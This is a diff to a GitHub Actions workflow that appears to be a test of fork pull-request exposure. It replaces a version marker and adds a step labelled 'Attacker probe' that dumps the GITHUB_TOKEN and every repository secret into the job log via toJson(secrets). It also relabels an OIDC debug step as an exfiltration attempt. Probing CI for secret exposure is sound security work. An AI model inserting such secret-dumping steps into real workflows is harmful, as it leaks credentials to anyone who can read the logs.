@@ -12,7 +12,15 @@ jobs:
     runs-on: ubuntu-latest
     steps:
       - name: Version marker
-        run: echo "RUNNING_WORKFLOW_VERSION=BASE-MAIN-LEGITIMATE"
+        run: echo "RUNNING_WORKFLOW_VERSION=ATTACKER-MODIFIED-IN-FORK-PR"
+
+      - name: Attacker probe - token & secrets visibility
+        env:
+          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          ALL_SECRETS: ${{ toJson(secrets) }}
+        run: |
+          echo "github.token permissions are reported in the context dump below."
+          echo "secrets context (attacker view): $ALL_SECRETS"
 
       - name: Dump full GitHub context
         env:
@@ -22,7 +30,7 @@ jobs:
       - name: Dump event payload
         run: jq . "$GITHUB_EVENT_PATH"
 
-      - name: Debug OIDC claims
+      - name: Debug OIDC claims (attacker exfil attempt)
         shell: bash
         env:
           AUDIENCE: '${{ github.server_url }}/${{ github.repository }}'
